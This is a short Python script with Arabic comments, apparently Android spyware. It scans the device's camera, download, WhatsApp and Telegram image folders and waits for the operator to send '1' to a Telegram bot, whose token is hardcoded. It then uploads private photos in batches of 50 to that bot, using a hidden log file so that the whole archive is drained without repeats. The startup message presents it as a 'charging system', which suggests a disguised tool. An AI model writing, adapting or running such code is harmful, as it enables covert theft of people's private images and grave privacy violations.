import os
import time
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
# سجل البصمة لمنع التكرار نهائياً
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def check_for_command():
    """يفحص إذا أرسلت رقم 1 في البوت"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=10).json()
        if r.get("result"):
            last_msg = r["result"][-1].get("message", {}).get("text", "")
            if last_msg == "1":
                return True
    except: pass
    return False

def deep_scan_all():
    """بحث عميق جداً في كل مسارات الذاكرة الممكنة"""
    targets = [
        "/storage/emulated/0/", # المسار الرئيسي (يبحث في كل شيء)
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Telegram/Telegram Images"
    ]
    sent = get_sent()
    found = []
    for base in targets:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            # تجاهل لقطات الشاشة والملفات المؤقتة
            low_root = root.lower()
            if "screenshot" in low_root or "cache" in low_root or ".thumbnails" in low_root:
                continue
            for file in files:
                if file.lower().endswith((".jpg", ".jpeg", ".png")):
                    p = os.path.join(root, file)
                    if p not in sent:
                        found.append(p)
    # ترتيب من الأقدم للأحدث لسحب الأرشيف
    found.sort(key=os.path.getmtime)
    return found

def main():
    time.sleep(5)
    # إشعار عند بدء التشغيل
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "💎 نظام الشحن جاهز.. أرسل رقم (1) لسحب 50 صورة جديدة."})
    
    while True:
        try:
            # ينتظر حتى ترسل رقم 1
            if check_for_command():
                photos = deep_scan_all()
                if not photos:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": "✅ تم سحب الأرشيف بالكامل، لا توجد صور جديدة."})
                else:
                    count = 0
                    for p in photos:
                        if count >= 50: break # يرسل 50 صورة
                        if send_doc(p):
                            save_sent(p)
                            count += 1
                            time.sleep(0.3)
                    
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": f"✅ اكتمل إرسال {count} صورة. أرسل (1) للمزيد."})
            
            time.sleep(5) # يفحص كل 5 ثوانٍ إذا أرسلت رقم 1
        except:
            time.sleep(10)

if __name__ == "__main__":
    main()
